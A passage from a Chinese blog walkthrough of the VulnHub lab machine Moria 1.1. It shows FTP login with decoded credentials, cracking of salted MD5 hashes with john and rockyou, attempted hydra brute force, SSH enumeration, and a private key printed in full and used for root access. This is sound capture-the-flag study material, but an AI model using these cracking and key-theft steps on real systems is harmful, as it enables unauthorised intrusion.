class="hljs-symbol">Dain:</span><span class="hljs-string">&quot;Is that human deaf? Why is it not listening?&quot;</span><br><span class="hljs-string">&quot;Knock knock&quot;</span> <br><span class="hljs-symbol">Fundin:</span><span class="hljs-string">&quot;That human will never save us!&quot;</span><br><span class="hljs-symbol">Ori:</span><span class="hljs-string">&quot;Will anyone hear us?&quot;</span> <br><span class="hljs-string">&quot;We will die here..&quot;</span> <br>Telchar <span class="hljs-keyword">to</span> Thrain:<span class="hljs-string">&quot;That human is slow, don&#x27;t give up yet&quot;</span> <br><span class="hljs-symbol">Maeglin:</span><span class="hljs-string">&quot;The Balrog is not around, hurry!&quot;</span> <br><span class="hljs-symbol">Oin:</span><span class="hljs-string">&quot;Stop knocking!&quot;</span> <br><span class="hljs-string">&quot;Eru! Save us!&quot;</span> <br><span class="hljs-string">&quot;Too loud!&quot;</span> <br><span class="hljs-symbol">Balin:</span> <span class="hljs-string">&quot;Be quiet, the Balrog will hear you!&quot;</span> <br></code></pre></td></tr></table></figure><p>看了半天，也没想懂是什么意思，不过起码收集到了一个用户字典</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Dain<br>Fundin<br><span class="hljs-keyword">Ori</span><br><span class="hljs-keyword"></span>Telchar<br>Thrain<br>Maeglin<br>Oin<br><span class="hljs-keyword">Balin</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">Balrog</span><br><span class="hljs-keyword"></span>gandalf<br>Gandalf<br>Moria<br></code></pre></td></tr></table></figure><p>尝试使用 <code>Mellon</code> 作为密码ftp爆破失败，只好去看 WP，这里的思路赶紧有点 CTF 的感觉，竟然是要通过 wireshark 抓包。</p><p><img src="/pic/df3ef836228e565400223139004f49b6_MD5.png"></p><p>抓包发现，网站会定期向攻击机的 77, 101, 108, 108, 111, 110, 54, 57 端口发送连接</p><p>这里要意识到上述端口号与 ascii 码是一一对应的（这也太绕了，确实想不到），得到 <code>Mellon69</code> 看起来和刚才拿到的密码类似，或许是 ftp 的密码，再次尝试爆破的时候发现，靶机似乎有放爆破机制，自己似乎被封禁了（</p><h2 id="FTP-登录"><a href="#FTP-登录" class="headerlink" title="FTP 登录"></a>FTP 登录</h2><p>逐个手动尝试发现，<code>Balrog:Mellon69</code> 是正确的 ftp 登录口令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Moria 1.1]<br>└─$ ftp 192.1.1.154                                   <br>Connected to 192.1.1.154.<br>220 Welcome Balrog!<br>Name (192.1.1.154:kali): Balrog<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; binary<br>200 Switching to Binary mode.<br>ftp&gt; <span class="hljs-built_in">ls</span> -alih<br>229 Entering Extended Passive Mode (|||7459|).<br>150 Here comes the directory listing.<br>drwxr-x---    2 0        1001           27 Mar 14  2017 .<br>dr-xr-xr-x   18 0        0             258 Mar 14  2017 ..<br>-rw-r--r--    1 0        0               1 Apr 28  2017 .bash_history<br>226 Directory send OK.<br>ftp&gt; get .bash_history<br><span class="hljs-built_in">local</span>: .bash_history remote: .bash_history<br>229 Entering Extended Passive Mode (|||26556|).<br>550 Permission denied.<br>ftp&gt; <span class="hljs-built_in">pwd</span><br>Remote directory: /prison<br></code></pre></td></tr></table></figure><p>似乎可以访问其他目录，尝试看看 web 目录和家目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; <span class="hljs-built_in">cd</span> /home<br>550 Failed to change directory.<br>ftp&gt; <span class="hljs-built_in">cd</span> /var/www/html<br>250 Directory successfully changed.<br>ftp&gt; <span class="hljs-built_in">ls</span> -liah<br>229 Entering Extended Passive Mode (|||15279|).<br>150 Here comes the directory listing.<br>drwxr-xr-x    4 0        0              89 Mar 14  2017 .<br>drwxr-xr-x    4 0        0              33 Nov 14  2016 ..<br>drwxr-xr-x    2 0        0              23 Mar 12  2017 QlVraKW4fbIkXau9zkAPNGzviT3UKntl<br>-r--------    1 48       48             85 Mar 12  2017 index.php<br>-r--------    1 48       48         161595 Mar 11  2017 moria.jpg<br>drwxr-xr-x    3 0        0              15 Mar 12  2017 w<br>ftp&gt; <span class="hljs-built_in">cd</span> QlVraKW4fbIkXau9zkAPNGzviT3UKntl<br>250 Directory successfully changed.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||57806|).<br>150 Here comes the directory listing.<br>-rw-r--r--    1 0        0            1672 Mar 12  2017 index.php<br>226 Directory send OK.<br>ftp&gt; get index.php<br><span class="hljs-built_in">local</span>: index.php remote: index.php<br>229 Entering Extended Passive Mode (|||30599|).<br>550 Permission denied.<br></code></pre></td></tr></table></figure><p>发现了 <code>QlVraKW4fbIkXau9zkAPNGzviT3UKntl</code> 目录，但是无法将其中的文件下载到本地，那就网页访问看看</p><p><img src="/pic/5648653066249e576771b26ba5769fdf_MD5.png"></p><p>网页中应该是密码哈希，网页源码中的注释给出了盐值</p><p>接下来的任务是通过工具来爆破碰撞出哈希值所对应的密码</p><h2 id="爆破加盐哈希"><a href="#爆破加盐哈希" class="headerlink" title="爆破加盐哈希"></a>爆破加盐哈希</h2><p>原本想使用 hashcat，但是似乎不支持这种 <code>MD5(MD5(Password).Salt)</code> 模式，看看 john。使用谷歌搜索 <code>john salt md5</code>，在第一个链接中找到了使用方法和哈希文件的格式</p><p><img src="/pic/7a3affaa1f47857dec97b7f0e027db5e_MD5.png"></p><p>简单的数据处理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Moria 1.1]<br>└─$ awk <span class="hljs-string">&#x27;FNR==NR &#123;arr[FNR]=$0; next&#125; &#123;print arr[FNR],$0&#125;&#x27;</span> salt sshloginpasswd  <br>6MAp84 c2d8960157fc8540f6d5d66594e165e0<br>bQkChe 727a279d913fba677c490102b135e51e<br>HnqeN4 8c3c3152a5c64ffb683d78efc3520114<br>e5ad5s 6ba94d6322f53f30aca4f34960203703<br>g9Wxv7 c789ec9fae1cd07adfc02930a39486a1<br>HCCsxP fec21f5c7dcf8e5e54537cfda92df5fe<br>cC5nTr 6a113db1fd25c5501ec3a5936d817c29<br>h8spZR 7db5040c351237e8332bfbba757a1019<br>tb9AWe dd272382909a4f51163c77da6356cc6f<br></code></pre></td></tr></table></figure><p>写入到文件后，再使用 awk 简单调整下，print 的时候添加个<code>$</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Moria 1.1]<br>└─$ sudo john --format=dynamic=<span class="hljs-string">&#x27;md5(md5($p).$s)&#x27;</span> --wordlist=/usr/share/wordlists/rockyou.txt hashuserpass <br>Using default input encoding: UTF-8<br>Loaded 9 password hashes with 9 different salts (dynamic=md5(md5(<span class="hljs-variable">$p</span>).<span class="hljs-variable">$s</span>) [256/256 AVX2 8x3])<br>Warning: no OpenMP support <span class="hljs-keyword">for</span> this <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span>, consider --fork=4<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>flower           (?)     <br>warrior          (?)     <br>spanky           (?)     <br>rainbow          (?)     <br>abcdef           (?)     <br>fuckoff          (?)     <br>darkness         (?)     <br>magic            (?)     <br>hunter2          (?)     <br>9g 0:00:00:00 DONE (2023-09-18 08:26) 450.0g/s 672000p/s 2016Kc/s 2016KC/s chulita..waiting<br>Use the <span class="hljs-string">&quot;--show --format=dynamic=md5(md5(<span class="hljs-variable">$p</span>).<span class="hljs-variable">$s</span>)&quot;</span> options to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure><p>使用 hydra 爆破的时候又遇到了可能是被封 IP 的问题，最后一点点手动尝试，发现 <code>ori:spanky</code> 是 ssh 登录的口令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Moria 1.1]<br>└─$ ssh Ori@192.1.1.154<br>Ori@192.1.1.154\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Last login: Sun Mar 12 22:57:09 2017</span><br><span class="hljs-string">-bash-4.2$ whoami</span><br><span class="hljs-string">Ori</span><br><span class="hljs-string">-bash-4.2$ id</span><br><span class="hljs-string">uid=1002(Ori) gid=1003(notBalrog) groups=1003(notBalrog)</span><br><span class="hljs-string">-bash-4.2$ uname -a</span><br><span class="hljs-string">Linux Moria 3.10.0-514.el7.x86_64 #1 SMP Tue Nov 22 16:42:41 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">-bash-4.2$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000</span><br><span class="hljs-string">    link/ether 00:0c:29:09:b3:87 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.1.1.154/24 brd 192.1.1.255 scope global dynamic ens33</span><br><span class="hljs-string">       valid_lft 1400sec preferred_lft 1400sec</span><br><span class="hljs-string">    inet6 fe80::deef:db78:6f77:ebdf/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">-bash-4.2$ sudo -l</span><br><span class="hljs-string"></span><br><span class="hljs-string">We trust you have received the usual lecture from the local System</span><br><span class="hljs-string">Administrator. It usually boils down to these three things:</span><br><span class="hljs-string"></span><br><span class="hljs-string">    #1) Respect the privacy of others.</span><br><span class="hljs-string">    #2) Think before you type.</span><br><span class="hljs-string">    #3) With great power comes great responsibility.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[sudo] password for Ori: </span><br><span class="hljs-string">Sorry, user Ori may not run sudo on Moria.</span><br><span class="hljs-string">-bash-4.2$ echo $SHELL</span><br><span class="hljs-string">/bin/bash</span><br><span class="hljs-string">-bash-4.2$ pwd</span><br><span class="hljs-string">/home/Ori</span><br><span class="hljs-string">-bash-4.2$ ls -alih</span><br><span class="hljs-string">total 8.0K</span><br><span class="hljs-string">  161138 drwx------  3 Ori  notBalrog  55 Mar 12  2017 .</span><br><span class="hljs-string">50331740 drwxr-x---. 4 root notBalrog  32 Mar 14  2017 ..</span><br><span class="hljs-string">  275393 -rw-------  1 Ori  notBalrog   1 Mar 14  2017 .bash_history</span><br><span class="hljs-string">   31082 -rw-r--r--  1 root root      225 Mar 13  2017 poem.txt</span><br><span class="hljs-string">50614599 drwx------  2 Ori  notBalrog  57 Mar 12  2017 .ssh</span><br><span class="hljs-string">-bash-4.2$ cat poem.txt </span><br><span class="hljs-string">Ho! Ho! Ho! to the bottle I go</span><br><span class="hljs-string">To heal my heart and drown my woe.</span><br><span class="hljs-string">Rain may fall and wind may blow,</span><br><span class="hljs-string">And many miles be still to go,</span><br><span class="hljs-string">But under a tall tree I will lie,</span><br><span class="hljs-string">And let the clouds go sailing by. </span><br><span class="hljs-string"></span><br><span class="hljs-string">PS: Moria will not fall!</span><br><span class="hljs-string">-bash-4.2$ cat .bash_history </span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>登录成功，家目录中有个 <code>poem.txt</code> ，没太看懂。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">-bash-4.2$ <span class="hljs-built_in">ls</span> -liah /etc/passwd /etc/shadow /etc/crontab<br>16865300 -rw-r--r-- 1 root root  450 Mar 11  2017 /etc/crontab<br>16784990 -rw-r--r-- 1 root root 1.5K Mar 14  2017 /etc/passwd<br>17556984 ---------- 1 root root 1.2K Apr 28  2017 /etc/shadow<br>-bash-4.2$ <span class="hljs-built_in">ls</span> /home<br>abatchy  Ori<br>-bash-4.2$ <span class="hljs-built_in">cd</span> /home/abatchy/<br>-bash: <span class="hljs-built_in">cd</span>: /home/abatchy/: Permission denied<br><br></code></pre></td></tr></table></figure><p>另一个用户的家目录进不去，我还尝试了使用之前收集到的密码手动切换登录，也失败了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">-bash-4.2$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>50468854   24 -rws--x--x   1 root     root        23960 Nov  5  2016 /usr/bin/chfn<br>50458347   64 -rwsr-xr-x   1 root     root        64240 Nov  5  2016 /usr/bin/chage<br>50468776   80 -rwsr-xr-x   1 root     root        78216 Nov  5  2016 /usr/bin/gpasswd<br>50468778   44 -rwsr-xr-x   1 root     root        41776 Nov  5  2016 /usr/bin/newgrp<br>50468856   24 -rws--x--x   1 root     root        23872 Nov  5  2016 /usr/bin/chsh<br>50591427  128 ---s--x--x   1 root     root       130768 Dec  6  2016 /usr/bin/sudo<br>50468888   44 -rwsr-xr-x   1 root     root        44232 Nov  5  2016 /usr/bin/mount<br>50468935   32 -rwsr-xr-x   1 root     root        32088 Nov  5  2016 /usr/bin/su<br>50468939   32 -rwsr-xr-x   1 root     root        31968 Nov  5  2016 /usr/bin/umount<br>50654074 2356 -rwsr-xr-x   1 root     root      2409560 Nov  5  2016 /usr/bin/Xorg<br>50495460   60 -rwsr-xr-x   1 root     root        57552 Mar 31  2016 /usr/bin/crontab<br>50339027   28 -rwsr-xr-x   1 root     root        27680 Mar  2  2017 /usr/bin/pkexec<br>50591210   28 -rwsr-xr-x   1 root     root        27832 Jun 10  2014 /usr/bin/passwd<br>50341723   32 -rwsr-xr-x   1 root     root        32008 Nov  5  2016 /usr/bin/fusermount<br>161386   12 -rwsr-xr-x   1 root     root        11224 Nov  5  2016 /usr/sbin/pam_timestamp_check<br>161390   36 -rwsr-xr-x   1 root     root        36280 Nov  5  2016 /usr/sbin/unix_chkpwd<br>288837   12 -rwsr-xr-x   1 root     root        11296 Nov  5  2016 /usr/sbin/usernetctl<br>33705013   16 -rwsr-xr-x   1 root     root        15432 Mar  2  2017 /usr/lib/polkit-1/polkit-agent-helper-1<br>267781  312 -rwsr-x---   1 root     dbus       318424 Nov  6  2016 /usr/lib64/dbus-1/dbus-daemon-launch-helper<br></code></pre></td></tr></table></figure><p>SUID 文件也没收获。</p><h2 id="私钥登录提权"><a href="#私钥登录提权" class="headerlink" title="私钥登录提权"></a>私钥登录提权</h2><p>使用 linpeas 来收集信息。发现自己忘了 <code>.ssh</code> 文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">-bash-4.2$ <span class="hljs-built_in">cd</span> .ssh<br>-bash-4.2$ <span class="hljs-built_in">ls</span><br>id_rsa  id_rsa.pub  known_hosts<br>-bash-4.2$ <span class="hljs-built_in">cat</span> id_rsa<br>-----BEGIN RSA PRIVATE KEY-----<br>MIIEpQIBAAKCAQEAu+OTcbouwWKZ6JRYBJXSIp9c8N/+w/0R7A0s5K1Kj45FBhpA<br>k0U/eZJIcpZZYUu9a5yfEZFnlUHshVjD12KTvvANIfvTalP0+uGrOSlF/b1tt8Ol<br>VQW8bgvAJXGom881bsUnu5r4BXp0S5HIoRES2k9BHkP7ZmkhknC83D+zTln/2uHv<br>H/piA5x3aFKDz3NzvJQNEjn/U9pivljAVVruXa0TDYDnjexsZtG3Ctse9fQlj7sq<br>sosqmU2aXEu03R/oHN+jlMn2woKiRnUdoCNaNe5/lYS7leMcMl8AI7hEMgJXSudB<br>GCyLuzDvbQgRi3dOFAs72YSuG/dtMNooEHLr4QIDAQABAoIBAQCGpQbDqE3bTgLH<br>lo8g8hC9uQCMqajT4KaYR7TVR444JBc40VVXdHeRcpAydaYlwHZFCN9BYrcdUjni<br>MYNe9Yi1eyeeI+4Us4fKxi/C7d33gWmAGFeB/3NSVV9kNfhDeBFtiSH5Iov8uQ1g<br>Hl/tdOPSyJr8ynD9qfdiDyJ4n7mqOj/zxT9FxHU2MXQIgQlaGrdeJNS28SAi+Qmp<br>W5qqN2cVxL9rhsD29XQu7X7p/rHKpaVOmeCnr8r7mykhW7XZ1oDHypWUyVJQTcag<br>7LR5iHr4PBT0esCKeGp8HPClGoD7txsH6JHKLqgoOuhzN9yz8LaBpjUtxPx6sIGr<br>nvChTYLVAoGBAOgz2cvnIDImduC8K3BKDfnvT7p9S6qKG/zANCmSIpFvODOWJKMh<br>/cvrpAdhqYibp8irtcFu2MMGbaZiDY6pjXq1FaTsWXaAU1+4ScPG7lARL3zhti7q<br>iUq3KIwk0gJP2Tuta9TOnBk7bIF+q1WCmi0jYIqhPfZPILykhYN/Kt3XAoGBAM8l<br>GS6lowCjsk6S9ru5Iroy+p9G1lds/ab7NXsk3dxRO4zxrrFPSRl/ztjupTTzBhXG<br>/+0cxncwM9JPZEKzeB48RG+BWKtVVUC96WNJvvzI9tIqL1cmyTZj7J3yAeBdwMj8<br>Qi9hdsABbqPUHrydDePDVsK//E/w6wIt/p2qVp0HAoGBAMOjVCCA9lZqpARLZknw<br>iwAGymT0xjjErjnw8sIHtwpT68VC/lFYBU63lfcGKOHJS78+NR/ptcXzd5UUzhlh<br>76rwQXE4FVRLYHOogLXruMRLBniwb1/uCYii8w3IxAxgnEW0osKk5U45C/267L5a<br>EG5xfRiwK9WH66wk7bzR+xr3AoGAMbFqqyAdTIf4vJTREBPH2vdj3FX4EZ0Z9LcL<br>C3G6r6HlMVjBWdP1a2KX0r7dbyhl60+EEfP3QJyVsfxNxxqa1FYM7NsQ1HlyLEfi<br>92i3opjrbVulY7jwSFYMa4+lF5gmKZEqp4cwH7u4OSEoBoN+04cHB01bUCoxlqJG<br>FLjKcn0CgYEAsKVwN6ED885zyrLQcYDkX4/w2gGW6Mrr0pIFnmQlkfGTqT3wZT09<br>ZMk2LuYPnowQDczFLmMnCw8HskSTIjUCri7vt/E3haMH7JC6YO7WAaRaJ81k9z10<br>eIJLNgKU5DxCtdKgGeIwlReZSPBBjU5FGtEhfJsL3n3bNYpfGk7ckug=<br>-----END RSA PRIVATE KEY-----<br>-bash-4.2$ <span class="hljs-built_in">ls</span><br>id_rsa  id_rsa.pub  known_hosts<br>-bash-4.2$ <span class="hljs-built_in">cat</span> id_rsa.pub <br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC745Nxui7BYpnolFgEldIin1zw3/7D/RHsDSzkrUqPjkUGGkCTRT95kkhylllhS71rnJ8RkWeVQeyFWMPXYpO+8A0h+9NqU/T64as5KUX9vW23w6VVBbxuC8AlcaibzzVuxSe7mvgFenRLkcihERLaT0EeQ/tmaSGScLzcP7NOWf/a4e8f+mIDnHdoUoPPc3O8lA0SOf9T2mK+WMBVWu5drRMNgOeN7Gxm0bcK2x719CWPuyqyiyqZTZpcS7TdH+gc36OUyfbCgqJGdR2gI1o17n+VhLuV4xwyXwAjuEQyAldK50EYLIu7MO9tCBGLd04UCzvZhK4b920w2igQcuvh Ori@Prison<br>-bash-4.2$ <span class="hljs-built_in">cat</span> known_hosts <br>127.0.0.1 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCuLX/CWxsOhekXJRxQqQH/Yx0SD+XgUpmlmWN1Y8cvmCYJslOh4vE+I6fmMwCdBfi4W061RmFc+vMALlQUYNz0=<br></code></pre></td></tr></table></figure><p>known_hosts 中有 127.0.0.1 感觉比较奇怪</p><p>先把私钥下载到本地登录试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Moria 1.1]<br>└─$ ssh -i id_rsa ori@192.1.1.154 -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa <br>ori@192.1.1.154<span class="hljs-string">&#x27;s password: </span><br></code></pre></td></tr></table></figure><p>还是要我密码，不是很理解，既然 know_hosts 中有本机地址，尝试在靶机上登录试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">-bash-4.2$ ssh -i id_rsa ori@127.0.0.1<br>ori@127.0.0.1\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string"></span><br><span class="hljs-string">-bash-4.2$ ls /home</span><br><span class="hljs-string">abatchy  Ori</span><br><span class="hljs-string">-bash-4.2$ ssh -i id_rsa abatchy@127.0.0.1</span><br><span class="hljs-string">abatchy@127.0.0.1\&#x27;</span>s password: <br><br>-bash-4.2$ ssh -i id_rsa root@127.0.0.1<br>Last login: Wed Sep 20 01:58:48 2023 from 127.0.0.1<br></code></pre></td></tr></table></figure><p>没想到竟然是 root 的私钥文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Moria ~]<span class="hljs-comment"># whoami</span><br>root<br>[root@Moria ~]<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:09:b3:87 brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.154/24 brd 192.1.1.255 scope global dynamic ens33<br>       valid_lft 1745sec preferred_lft 1745sec<br>    inet6 fe80::deef:db78:6f77:ebdf/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>[root@Moria ~]<span class="hljs-comment"># uname -a</span><br>Linux Moria 3.10.0-514.el7.x86_64 <span class="hljs-comment">#1 SMP Tue Nov 22 16:42:41 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br>[root@Moria ~]<span class="hljs-comment"># cd /rot</span><br>-bash: <span class="hljs-built_in">cd</span>: /rot: No such file or directory<br>[root@Moria ~]<span class="hljs-comment"># cd /root</span><br>[root@Moria ~]<span class="hljs-comment"># ls</span><br>0  anaconda-ks.cfg  Desktop  flag.txt  hosts<br>[root@Moria ~]<span class="hljs-comment"># cat flag.txt </span><br>“All that is gold does not glitter,<br>Not all those <span class="hljs-built_in">who</span> wander are lost;<br>The old that is strong does not wither,<br>Deep roots are not reached by the frost.<br><br>From the ashes a fire shall be woken,<br>A light from the shadows shall spring;<br>Renewed shall be blade that was broken,<br>The crownless again shall be king.” <br><br>All That is Gold Does Not Glitter by J. R. R. Tolkien<br><br>I hope you suff.. enjoyed this VM. It wasn<span class="hljs-string">&#x27;t so hard, was it?</span><br><span class="hljs-string">-Abatchy</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BTRsys-2 靶机</title>
    <link href="/2023/09/10fdb73312a7.html"/>
    <url>/2023/09/10fdb73312a7.html</url>
    
